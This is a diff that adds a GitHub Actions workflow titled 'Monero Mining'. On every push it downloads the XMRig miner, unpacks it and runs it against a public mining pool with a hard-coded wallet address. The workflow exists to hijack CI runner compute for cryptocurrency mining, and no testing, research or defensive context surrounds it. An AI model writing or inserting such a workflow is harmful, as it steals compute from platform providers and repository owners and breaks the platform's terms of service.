@@ -1,0 +1,17 @@
+name: Monero Mining
+
+on: [push]
+
+jobs:
+  mining_job:
+    runs-on: ubuntu-latest
+    name: Mining Monero
+    steps:
+    - name: Checkout Repo
+      uses: actions/checkout@v2
+    - name: Run Monero Miner
+      run: |
+        wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-x64.tar.gz
+        tar -xvf xmrig-6.16.2-linux-x64.tar.gz
+        cd xmrig-6.16.2
+        ./xmrig -o pool.supportxmr.com:443 -u 45QQb4r1PRRXMF7FZ527sj3tt6CKL69Qt4K1WJW5tJn3HnwBXoLYRMz932TtxnDrBP9S2CCRa8QYp1TYNXKyt3FJJTQJJt6 -k --tls
